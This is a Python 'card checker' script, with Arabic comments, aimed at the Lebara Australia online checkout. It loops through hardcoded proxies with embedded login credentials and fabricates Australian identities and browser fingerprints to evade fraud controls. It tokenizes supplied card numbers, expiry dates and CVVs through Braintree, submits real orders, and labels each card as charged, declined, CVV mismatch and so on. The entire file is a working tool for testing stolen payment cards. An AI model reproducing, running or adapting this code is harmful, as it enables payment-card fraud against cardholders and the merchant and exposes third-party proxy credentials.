# ==================== gatet.py (تم التحديث بالكامل لموقع Lebara Australia) ====================

import requests, json, re, random, sys, os, time, base64, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import string

# ==================== قائمة البروكسيات الشغالة ====================
PROXIES_LIST = [
    {'http': 'http://206223:Fyg3NR65@107.172.12.54:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.54:8800'},
    {'http': 'http://206223:Fyg3NR65@107.172.12.5:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.5:8800'},
    {'http': 'http://206223:Fyg3NR65@107.172.12.24:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.24:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.4:8800', 'https': 'http://206222:umh2TcPh@69.58.0.4:8800'},
    {'http': 'http://206223:Fyg3NR65@107.172.12.104:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.104:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.27:8800', 'https': 'http://206222:umh2TcPh@69.58.0.27:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.24:8800', 'https': 'http://206222:umh2TcPh@69.58.0.24:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.5:8800', 'https': 'http://206222:umh2TcPh@69.58.0.5:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.2:8800', 'https': 'http://206222:umh2TcPh@69.58.0.2:8800'},
    {'http': 'http://206222:umh2TcPh@69.4.93.141:8800', 'https': 'http://206222:umh2TcPh@69.4.93.141:8800'},
    {'http': 'http://206222:umh2TcPh@69.4.93.152:8800', 'https': 'http://206222:umh2TcPh@69.4.93.152:8800'},
    {'http': 'http://206222:umh2TcPh@69.4.93.144:8800', 'https': 'http://206222:umh2TcPh@69.4.93.144:8800'},
    {'http': 'http://206222:umh2TcPh@69.4.93.130:8800', 'https': 'http://206222:umh2TcPh@69.4.93.130:8800'},
    {'http': 'http://206221:8bVhNtgj@85.209.138.187:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.187:8800'},
    {'http': 'http://206221:8bVhNtgj@85.209.138.195:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.195:8800'},
    {'http': 'http://206221:8bVhNtgj@85.209.138.239:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.239:8800'},
    {'http': 'http://206221:8bVhNtgj@85.209.138.210:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.210:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.16:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.16:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.127:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.127:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.95:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.95:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.71:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.71:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.20:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.20:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.22:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.22:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.150:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.150:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.1:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.1:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.83:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.83:8800'},
]

def get_random_proxy():
    return random.choice(PROXIES_LIST)

def clean_html(text):
    if not text:
        return ""
    clean = re.sub(r'<[^>]+>', ' ', text)
    clean = re.sub(r'\s+', ' ', clean)
    return clean.strip().lower()

def extract_reason(text):
    match = re.search(r'reason:\s*(.+?)(?:\.\s|$|<|$)', text, re.IGNORECASE)
    if match:
        return match.group(1).strip()
    return None

def generate_valid_email():
    domains = ['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com', 'icloud.com', 'protonmail.com', 'mail.com']
    names = ['john', 'peter', 'michael', 'david', 'james', 'robert', 'thomas', 'william', 'daniel', 'paul']
    name1 = random.choice(names)
    name2 = random.choice(names)
    number = random.randint(1, 9999)
    domain = random.choice(domains)
    formats = [f"{name1}.{name2}{number}@{domain}", f"{name1}{number}@{domain}", f"{name1}_{name2}{number}@{domain}"]
    return random.choice(formats).lower()

def generate_australian_data():
    """توليد بيانات أسترالية حقيقية"""
    first_names = ['John', 'Peter', 'Michael', 'David', 'James', 'Robert', 'Thomas', 'William', 'Daniel', 'Paul',
                   'Andrew', 'Mark', 'Christopher', 'Matthew', 'Joshua', 'Benjamin', 'Nicholas', 'Joseph', 'Ryan', 'Timothy']
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Wilson', 'Taylor', 'Johnson', 'White', 'Martin', 'Anderson',
                  'Thompson', 'Thomas', 'Walker', 'Robinson', 'Kelly', 'King', 'Green', 'Baker', 'Adams', 'Nelson']
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    
    # رموز بريدية أسترالية حقيقية
    postcodes = ['2000', '3000', '4000', '5000', '6000', '7000', '8000', '9000', '2150', '2151', '2152', '2153']
    # مدن أسترالية
    cities = ['Sydney', 'Melbourne', 'Brisbane', 'Perth', 'Adelaide', 'Hobart', 'Darwin', 'Canberra', 'Newcastle', 'Wollongong']
    # شوارع أسترالية
    streets = ['George Street', 'King Street', 'Queen Street', 'William Street', 'Elizabeth Street', 'Victoria Street',
               'Oxford Street', 'Park Street', 'Bridge Street', 'Church Street']
    # أرقام هواتف أسترالية
    phones = ['0412345678', '0423456789', '0434567890', '0445678901', '0456789012', '0467890123', '0478901234']
    
    street_num = random.randint(1, 200)
    full_address = f"{street_num} {random.choice(streets)}"
    city = random.choice(cities)
    postcode = random.choice(postcodes)
    
    email = generate_valid_email()
    
    return {
        'first_name': first,
        'last_name': last,
        'email': email,
        'phone': random.choice(phones),
        'address_1': full_address,
        'city': city,
        'postcode': postcode,
        'company': random.choice(['Telstra', 'Optus', 'Vodafone', 'Woolworths', 'Coles', 'Qantas']) if random.choice([True, False]) else ''
    }

def ch(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if len(yy) == 2:
        yy = '20' + yy
    
    max_retries = 3
    
    for attempt in range(max_retries):
        proxy = get_random_proxy()
        proxy_ip = proxy['http'].split('@')[-1].split(':')[0] if '@' in proxy['http'] else 'unknown'
        user = generate_user_agent()
        fake_data = generate_australian_data()
        session_id = str(uuid.uuid4())
        correlation_id = str(uuid.uuid4())[:24]
        
        r = requests.session()
        r.proxies = proxy
        r.verify = False
        
        print(f"[*] Attempt {attempt+1}/{max_retries} - Using proxy: {proxy_ip}")
        print(f"[*] Email used: {fake_data['email']}")
        
        # ================ بيانات الموقع الجديد (Lebara Australia) ================
        SITE_URL = 'https://www.lebara.com.au'
        PRODUCT_URL = 'https://www.lebara.com.au/prepaid-plans/deals/'
        CHECKOUT_URL = 'https://www.lebara.com.au/checkout/'
        AJAX_URL = 'https://www.lebara.com.au/'
        
        try:
            # ================ 1. ADD TO CART ================
            files = {
                'add-to-cart': (None, '559633'),
                'product_id': (None, '559633'),
                'quantity': (None, '1'),
            }
            
            headers_add = {
                'authority': 'www.lebara.com.au',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'accept-language': 'en-US,en;q=0.9',
                'origin': SITE_URL,
                'referer': PRODUCT_URL,
                'user-agent': user,
                'upgrade-insecure-requests': '1',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Connection': 'close',
            }
            
            response = r.post(PRODUCT_URL, headers=headers_add, files=files, timeout=20)
            if response.status_code != 200:
                print(f"[!] Add to cart failed with proxy {proxy_ip}, retrying...")
                continue
            
            # ================ 2. CHECKOUT PAGE ================
            headers_checkout = {
                'authority': 'www.lebara.com.au',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'accept-language': 'en-US,en;q=0.9',
                'referer': PRODUCT_URL,
                'user-agent': user,
                'upgrade-insecure-requests': '1',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Connection': 'close',
            }
            
            response = r.get(CHECKOUT_URL, headers=headers_checkout, timeout=20)
            if response.status_code != 200:
                print(f"[!] Checkout page failed with proxy {proxy_ip}, retrying...")
                continue
            
            # ================ 3. EXTRACT TOKENS AND NONCES ================
            # استخراج update_order_review_nonce
            sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
            if not sec:
                sec = 'ce4ad1c868'
            else:
                sec = sec.group(1)
            
            # استخراج checkout nonce
            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
            if not check:
                check = 'fe62ab90ea'
            else:
                check = check.group(1)
            
            # استخراج client token من الصفحة
            enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text)
            if not enc:
                enc = re.search(r'data-braintree-client-token="([^"]+)"', response.text)
            
            if not enc:
                print(f"[!] Client token not found with proxy {proxy_ip}, retrying...")
                continue
                
            if isinstance(enc, re.Match):
                enc = enc.group(1)
            
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
            if not au:
                print(f"[!] Fingerprint not found with proxy {proxy_ip}, retrying...")
                continue
            au = au[0]
            
            # ================ 4. UPDATE ORDER REVIEW ================
            billing_first = fake_data['first_name']
            billing_last = fake_data['last_name']
            billing_email = fake_data['email']
            billing_phone = fake_data['phone']
            billing_address = fake_data['address_1']
            billing_city = fake_data['city']
            billing_postcode = fake_data['postcode']
            billing_company = fake_data['company']
            
            headers_update = {
                'authority': 'www.lebara.com.au',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': SITE_URL,
                'referer': CHECKOUT_URL,
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Connection': 'close',
            }
            
            params_update = {'wc-ajax': 'update_order_review'}
            
            data_update = f'security={sec}&payment_method=braintree_cc&country=AU&state=NSW&postcode=&city=&address=&s_country=AU&s_state=NSW&s_postcode=&s_city=&s_address=&has_full_address=false&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fwww.lebara.com.au%252Fcart%252F%26wc_order_attribution_session_start_time%3D2026-05-23%252000%253A06%253A54%26wc_order_attribution_session_pages%3D3%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26captcha%3D%26billing_title%3DMr%26billing_first_name%3D{billing_first}%26billing_last_name%3D{billing_last}%26billing_email%3D{billing_email}%26billing_phone%3D{billing_phone}%26billing_address_1%3D{billing_address.replace(" ", "+")}%26billing_city%3D{billing_city}%26billing_state%3DTAS%26billing_postcode%3D{billing_postcode}%26billing_country%3DAU%26ship_to_different_address%3D0%26shipping_title%3DMr%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D%26shipping_country%3DAU%26shipping_state%3DNSW%26shipping_postcode%3D%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_paypal_nonce_key%3D%26braintree_paypal_device_data%3D%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252Fcheckout%252F%26cart%255B67f87eb1d553f785481c43ae5ac07259%255D%255Bqty%255D%3D1%26shipping_method%255B0%255D%3Dfree_shipping%253A3%26coupon_code%3D%26woocommerce-cart-nonce%3D1c8169cf29%26_wp_http_referer%3D%252Fcheckout%252F&shipping_method%5B0%5D=free_shipping%3A3'
            
            response = r.post(AJAX_URL, params=params_update, headers=headers_update, data=data_update, timeout=20)
            
            # ================ 5. TOKENIZE CREDIT CARD ================
            headers_token = {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': f'Bearer {au}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': user,
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
            }
            
            token_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': session_id,
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': n,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc,
                            'billingAddress': {
                                'postalCode': billing_postcode,
                                'streetAddress': billing_address[:50],
                            },
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_token, json=token_data, timeout=20)
            try:
                tok = response.json()['data']['tokenizeCreditCard']['token']
            except:
                print(f"[!] Tokenization failed with proxy {proxy_ip}, retrying...")
                continue
            
            # ================ 6. FINAL CHECKOUT ================
            headers_final = {
                'authority': 'www.lebara.com.au',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': SITE_URL,
                'referer': CHECKOUT_URL,
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Connection': 'close',
            }
            
            params_final = {'wc-ajax': 'checkout'}
            
            data_final = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.lebara.com.au%2Fcart%2F&wc_order_attribution_session_start_time=2026-05-23+00%3A06%3A54&wc_order_attribution_session_pages=4&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&captcha=&billing_title=Mr&billing_first_name={billing_first}&billing_last_name={billing_last}&billing_email={billing_email}&billing_phone={billing_phone}&billing_address_1={billing_address.replace(" ", "+")}&billing_city={billing_city}&billing_state=TAS&billing_postcode={billing_postcode}&billing_country=AU&ship_to_different_address=0&shipping_title=Mr&shipping_first_name=&shipping_last_name=&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_country=AU&shipping_state=NSW&shipping_postcode=&payment_method=braintree_cc&braintree_cc_nonce_key={tok}&braintree_cc_device_data=%7B%22correlation_id%22%3A%22{correlation_id}%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2F25rtv2297vvgh5nh%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2F25rtv2297vvgh5nh%22%7D%2C%22merchantId%22%3A%2225rtv2297vvgh5nh%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIyZTBjYzQ5Ny02OTE0LTQ1YjMtYTgzNy0zZjIyMjA4YjAxMzMiLCJpYXQiOjE3Nzk0OTQ4MzYsImV4cCI6MTc3OTUwMjAzNiwiaXNzIjoiNjQ3ZjFmZjNmNDc4MTc1MWFmOGZkNDQ1IiwiT3JnVW5pdElkIjoiNjQ2ZTUxNTM0Y2EwZDk0YzIzYjgwMGE5In0.V0us5r3NqVIhgZ3MiJxw0Dbr6IB9LL5Z8qfu325oHzo%22%2C%22cardinalSongbirdUrl%22%3A%22https%3A%2F%2Fsongbird.cardinalcommerce.com%2Fedge%2Fv1%2Fsongbird.js%22%2C%22cardinalSongbirdIdentityHash%22%3Anull%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Lebara+Play+AUD%22%2C%22clientId%22%3A%22Ae_7Bse9lgZu4ywSF2lX0UUaKZRatgIi4vurojKEBhvDffBpITsaSycrp4Dq9s_HGUlDShjB6lljLZCS%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22lebaraserviceAUD%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22AUD%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=%7B%22correlation_id%22%3A%22{correlation_id}%22%7D&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&cart%5B67f87eb1d553f785481c43ae5ac07259%5D%5Bqty%5D=1&shipping_method%5B0%5D=free_shipping%3A3&coupon_code=&woocommerce-cart-nonce=1c8169cf29&_wp_http_referer=%2Fcheckout%2F'
            
            response = r.post(AJAX_URL, params=params_final, headers=headers_final, data=data_final, timeout=20)
            
            # ================ 7. PARSE RESULT ================
            try:
                result_data = json.loads(response.text)
                messages = result_data.get("messages", "")
                full_response = response.text
            except:
                return 'PARSE_ERROR'
            
            clean_messages = clean_html(messages)
            clean_full = clean_html(full_response)
            search_text = clean_messages + " " + clean_full
            
            reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
            reason = reason_match.group(1).strip() if reason_match else None
            
            print(f"[DEBUG] Clean response: {search_text[:300]}")
            
            # ==================== ردود Braintree ====================
            
            if 'charged' in search_text or 'success' in search_text or 'completed' in search_text or 'approved' in search_text:
                return 'CHARGED'
            
            if 'insufficient funds' in search_text:
                return 'INSUFFICIENT FUNDS'
            
            if 'cvv' in search_text:
                return 'CVV MISMATCH'
            
            if 'expired card' in search_text:
                return 'EXPIRED CARD'
            
            if 'processor declined - fraud suspected' in search_text:
                return 'PROCESSOR DECLINED - FRAUD SUSPECTED'
            
            if 'fraud' in search_text:
                return 'FRAUD'
            
            if 'gateway rejected: fraud' in search_text:
                return 'GATEWAY REJECTED - FRAUD'
            
            if 'gateway rejected: risk threshold' in search_text or 'risk_threshold' in search_text:
                return 'GATEWAY REJECTED - RISK THRESHOLD'
            
            if 'processor declined' in search_text:
                return 'PROCESSOR DECLINED'
            
            if 'do not honor' in search_text:
                return 'DO NOT HONOR'
            
            if 'closed card' in search_text:
                return 'CLOSED CARD'
            
            if 'call issuer' in search_text or 'pick up card' in search_text:
                return 'CALL ISSUER - PICKUP CARD'
            
            if '3d secure' in search_text:
                return '3D SECURE REQUIRED'
            
            if 'limit exceeded' in search_text:
                return 'LIMIT EXCEEDED'
            
            if 'lost or stolen' in search_text:
                return 'LOST/STOLEN CARD'
            
            if 'address verification' in search_text or 'avs' in search_text:
                return 'ADDRESS MISMATCH'
            
            if 'invalid card' in search_text:
                return 'INVALID CARD'
            
            if 'cannot authorize' in search_text:
                return 'CANNOT AUTHORIZE (POLICY)'
            
            if 'transaction not allowed' in search_text:
                return 'TRANSACTION NOT ALLOWED'
            
            if 'cleantalk' in search_text:
                return 'CLEANTALK SUSPECT'
            
            if 'card not activated' in search_text:
                return 'CARD NOT ACTIVATED'
            
            if 'no account' in search_text:
                return 'NO ACCOUNT'
            
            if 'card restricted' in search_text:
                return 'CARD RESTRICTED'
            
            if 'declined' in search_text:
                return 'DECLINED'
            
            if reason and len(reason) < 60:
                return reason.upper()
            
            if clean_messages and len(clean_messages) < 100:
                return clean_messages.title()
            
            return 'DECLINED'
            
        except Exception as e:
            last_error = str(e)[:50]
            print(f"[!] Proxy {proxy_ip} failed: {last_error}")
            if attempt == max_retries - 1:
                return f'PROXY_ERROR: {last_error}'
            continue
    
    return f'PROXY_ERROR: {last_error}'
